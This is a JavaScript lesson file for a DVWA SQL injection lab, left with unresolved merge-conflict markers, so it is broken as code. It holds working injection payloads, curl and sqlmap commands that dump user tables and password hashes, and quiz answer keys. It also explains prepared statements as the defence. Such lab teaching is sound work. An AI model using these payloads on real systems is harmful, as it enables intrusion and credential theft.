const LESSONS = [
  {
<<<<<<< HEAD
    title: "1. What is SQL Injection?",
    points: 20,
    content: `Welcome to the SQL Injection Lab! 

WHAT IS SQL INJECTION?
Imagine a website is asking a database guard: "Is this user allowed in?"
The guard speaks a special language called "SQL".

If we type a normal name like "Alice", the guard checks for Alice.
But what if we type a secret spell in SQL language? We can confuse the guard into giving us ALL the secrets! 

STEP 1: Start the Lab
Click "Launch DVWA Instance". Wait for your tiny private computer to start.

STEP 2: Log In
Username: admin
Password: password

STEP 3: Setup the Game
Scroll down and click "Create / Reset Database".

STEP 4: Security Level
Go to "DVWA Security" on the left menu. Make sure it is set to "Low" and click "Submit".`,
    questions: [
      { q: "What is the default username for our lab?", a: "admin" },
      { q: "What is the default password?", a: "password" },
      { q: "What language does the database guard speak?", a: "SQL" }
    ]
  },
  {
    title: "2. The Truth Trick (Low Level)",
    points: 30,
    content: `Let's cast our first SQL spell!

HOW TO DO THE TRICK:

1. Go to "SQL Injection" on the left menu.
2. The website asks for a User ID. If you type 1, it shows admin.
3. Now type our secret spell: \`' OR 1=1 #\`

Why does this work?
- The \`'\` symbol breaks us out of the normal name box.
- \`OR 1=1\` is a math trick. 1 always equals 1! So the guard thinks "Oh, this is always TRUE!"
- The \`#\` symbol is like saying "Shhh! Ignore the rest of the rules!"

Because 1=1 is true, the guard gets confused and dumps EVERY user from the database onto the screen!`,
    questions: [
      { q: "What math trick do we use to make the guard think everything is TRUE?", a: "1=1" },
      { q: "What symbol (#) tells the guard to ignore the rest of the rules?", a: "#" },
      { q: "Did the guard dump all the users on the screen? (yes/no)", a: "yes" }
    ]
  },
  {
    title: "3. The Hidden Dropdown (Medium Level)",
    points: 30,
    content: `Now the bouncer is slightly smarter. 

HOW TO DO THE TRICK:

1. Go to "DVWA Security" and change it to Medium.
2. Go back to "SQL Injection".
3. Oh no! There is no text box anymore! It's a dropdown menu. You can't type the spell!
4. But we are hackers. We can change the web page itself using DevTools!

THE HACK:
1. Right-click the dropdown menu and click "Inspect" (or open DevTools).
2. Look at the code. You will see something like \`<option value="1">1</option>\`.
3. Double-click the \`value="1"\` part.
4. Change it to our spell: \`value="1 OR 1=1"\` (No quotes needed this time!)
5. Press Enter. Now select the "1" from the dropdown and click Submit.

Boom! You hacked the dropdown!`,
    questions: [
      { q: "What kind of menu replaced the text box in the Medium level?", a: "dropdown" },
      { q: "What tool did we use to change the website code? (Dev...)", a: "DevTools" },
      { q: "Did we need to use the quote (') symbol for this spell? (yes/no)", a: "no" }
    ]
  },
  {
    title: "4. The Secret Input (High Level)",
    points: 30,
    content: `The High level tries to trick us by moving the input box somewhere else.

HOW TO DO THE TRICK:

1. Change security to High. Go to "SQL Injection".
2. Click "here to change your ID". A small popup appears!
3. This is called a "Second-Order" attack. We put the spell in one place (the popup), and it explodes in another place (the main page)!
4. Type our classic spell in the popup: \`' OR 1=1 #\`
5. Click Submit, then close the popup.
6. Look at the main page. The spell worked!`,
    questions: [
      { q: "Did the High level move the input box into a popup? (yes/no)", a: "yes" },
      { q: "What is it called when the spell is put in one place but explodes in another? (Second-...)", a: "Second-Order" },
      { q: "Did our classic spell still work? (yes/no)", a: "yes" }
    ]
  },
  {
    title: "5. The Strict Bouncer (Impossible Level)",
    points: 30,
    content: `Why did it fail on Impossible mode?

1. Change security to Impossible. Try our tricks again. They all fail!

THE DEFENSE (Prepared Statements):
Imagine the website fired the old, easily-confused guard and hired a strict robot named "Prepared Statement".

When you give the robot your spell: \`' OR 1=1 #\`
The robot doesn't try to read it as SQL language. It puts your spell in a heavy steel box. 

It tells the database: "Go find a user whose name is literally the exact characters Quote-O-R-Space-1-Equals-1-Hashtag".
Since no one has that crazy name, it safely returns nothing. The magic is completely broken!`,
    questions: [
      { q: "What is the name of the strict robot defense? (Prepared...)", a: "Prepared Statements" },
      { q: "Does the robot let your spell run as SQL code? (yes/no)", a: "no" },
      { q: "Is the database safe from SQL Injection now? (yes/no)", a: "yes" }
=======
    title: "Level 1: Low Security",
    points: 60,
    content: `🚀 ONE-TIME SETUP — Run this FIRST before any level
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Start your DVWA and Kali containers from the buttons above.
Inside the Kali terminal (docker exec -it <id> bash), run:

# Set your DVWA port (check the URL of your DVWA browser tab)
PORT=8206   ← replace with your actual port

# Step 1: Get CSRF token and login
TOKEN=$(curl -s -c /tmp/dvwa.txt "http://172.17.0.1:$PORT/login.php" | grep -oP "user_token' value='\\K[^']+")
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -L > /dev/null

# Step 2: Save the session ID to a variable
SID=$(grep PHPSESSID /tmp/dvwa.txt | awk '{print $NF}')
echo "Session ready: $SID"

If you see a session ID printed, you are logged in. ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 LEVEL 1 — LOW SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Set level to Low
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=low&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━━━
1. In DVWA click 'SQL Injection'. The input box sends a GET request.
2. Type these payloads one at a time:

  Confirm injectable:
    1' OR '1'='1    → shows ALL users if injectable

  Find column count (increase number until you get an error):
    1' ORDER BY 1#   → works
    1' ORDER BY 2#   → works
    1' ORDER BY 3#   → ERROR → 2 columns confirmed!

  Find which columns are displayed:
    1' UNION SELECT 1,2#    → look for '1' and '2' in output

  Extract DB info:
    1' UNION SELECT version(),user()#

  List all tables:
    1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()#

  Dump users:
    1' UNION SELECT user,password FROM users#

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Confirm injectable (should show multiple users)
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  | grep -o "First name:.*"

# Find column count — change 2 to 3 to see the error
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+ORDER+BY+2%23&Submit=Submit" \
  | grep -o "Unknown column"

# Dump username + password hash
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "What SQL keyword combines results from two SELECT queries?", a: "UNION" },
      { q: "How many columns does the DVWA sqli query return? (find with ORDER BY)", a: "2" },
      { q: "What is admin's password hash? (from UNION SELECT user,password FROM users#)", a: "5f4dcc3b5aa765d61d8327deb882cf99" },
      { q: "What plaintext password does that hash decode to?", a: "password" },
      { q: "What is the name of the database? (from UNION SELECT database(),null#)", a: "dvwa" }
    ]
  },
  {
    title: "Level 2: Medium Security",
    points: 60,
    content: `📋 LEVEL 2 — MEDIUM SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

What changed: Input is now a DROPDOWN. Sends POST request.
mysqli_real_escape_string() escapes quotes BUT the field is INTEGER — no quotes needed!

# Set level to Medium
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=medium&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD (Burp Suite)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Enable Burp Suite intercept.
2. Select a user from the dropdown → click Submit.
3. Burp shows: id=1&Submit=Submit
4. Change id to inject (NO quotes needed):
   1 UNION SELECT user,password FROM users#
5. Forward the request → see the dumped users in the response.

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Confirm injectable — should show multiple users
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 OR 1=1&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "First name:.*"

# Dump users (no quotes needed!)
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 UNION SELECT user,password FROM users#&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

# Get database name
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 UNION SELECT database(),user()&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" \
  --cookie="security=medium; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In Medium security, is the id parameter sent via GET or POST?", a: "POST" },
      { q: "What PHP function does DVWA Medium use to try to prevent injection?", a: "mysqli_real_escape_string" },
      { q: "Do you need single quotes when injecting into an integer-type field? (yes/no)", a: "no" },
      { q: "What is the 2nd username in the users table? (LIMIT 1,1)", a: "gordonb" },
      { q: "What is gordonb's password hash?", a: "e99a18c428cb38d5f260853678922e03" }
    ]
  },
  {
    title: "Level 3: High Security",
    points: 60,
    content: `📋 LEVEL 3 — HIGH SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

What changed: Input is on a separate POP-UP page (session-input.php).
Output appears on the MAIN page. There is also a LIMIT 1 clause — bypass with UNION.
This is called "second-order" or "split-page" SQL injection.

# Set level to High
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=high&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━━━
1. Click 'SQL Injection' → click the link to open the input POP-UP.
2. In the pop-up text box, type your payload → click Submit.
3. Close the pop-up → view the MAIN page to see the output.

  Dump users:
    1' UNION SELECT user,password FROM users#
  → Main page shows all usernames + hashes!

  Get DB info:
    1' UNION SELECT database(),user()#

🖥️  MANUAL CURL METHOD (two commands!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 1: POST the payload to the session input pop-up page
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
  -d "id=1' UNION SELECT user,password FROM users#&Submit=Submit" \
  -H "Cookie: security=high; PHPSESSID=$SID" > /dev/null

# STEP 2: Fetch the MAIN page to see the output
curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -H "Cookie: security=high; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD (use --second-url)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
  --data="id=1&Submit=Submit" \
  --second-url="http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  --cookie="security=high; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In High security, where is the input field located?", a: "pop-up" },
      { q: "What is the filename of the pop-up page?", a: "session-input.php" },
      { q: "What SQL clause limits High level output to 1 row?", a: "LIMIT" },
      { q: "What sqlmap flag tells it to look for output on a different URL?", a: "--second-url" },
      { q: "What is the 3rd username in the users table? (LIMIT 2,1)", a: "1337" }
    ]
  },
  {
    title: "Level 4: Impossible Security",
    points: 60,
    content: `📋 LEVEL 4 — IMPOSSIBLE SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

# Set level to Impossible
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=impossible&seclev_submit=Submit" > /dev/null

🧠 WHY PREPARED STATEMENTS BLOCK ALL INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Vulnerable code (Low/Medium/High):
  $query = "SELECT * FROM users WHERE id='$id'";
  User input becomes part of SQL → injection works!

Impossible (PDO Prepared Statement):
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
  $stmt->bindParam(':id', $id, PDO::PARAM_INT);
  SQL structure is compiled FIRST. Input arrives only as pure data. Injection impossible.

Click 'View Source' in DVWA to see this code yourself.

🖥️  PROVE IT — Confirm all attacks fail
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Classic UNION attack — returns no data (payload treated as literal string)
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
  | grep -oP "First name: \\K[^<]+"

# OR injection — returns nothing extra
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  | grep -c "First name:"

🤖 SQLMAP — Expects "not injectable"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=impossible; PHPSESSID=$SID" \
  --batch

Expected: "[WARNING] all tested parameters do not appear to be injectable"`,
    questions: [
      { q: "What PHP database extension does the Impossible level use? (3 letters)", a: "PDO" },
      { q: "What security technique prevents injection on the Impossible level? (two words)", a: "Prepared Statements" },
      { q: "Does a UNION payload extract data on the Impossible level? (yes/no)", a: "no" },
      { q: "Will sqlmap find any injection point on the Impossible level? (yes/no)", a: "no" },
      { q: "What word does sqlmap use in its warning when no injection is found?", a: "injectable" }
>>>>>>> refs/remotes/origin/main
    ]
  }
];
